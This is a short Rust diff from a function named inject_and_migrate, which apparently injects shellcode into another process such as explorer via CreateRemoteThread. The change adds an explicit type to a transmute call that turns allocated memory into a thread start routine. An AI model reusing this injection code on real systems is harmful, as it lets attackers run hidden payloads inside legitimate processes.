@@ -87,7 +87,7 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     // Call CreateRemoteThread to create the execution thread in the target PID
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateRemoteThread.html
-    let start_address_option = unsafe { Some(mem::transmute(base_address)) };
+    let start_address_option = unsafe { Some(mem::transmute::<*mut std::ffi::c_void, unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>(base_address)) };
     if unsafe {
         CreateRemoteThread(
             explorer_handle,
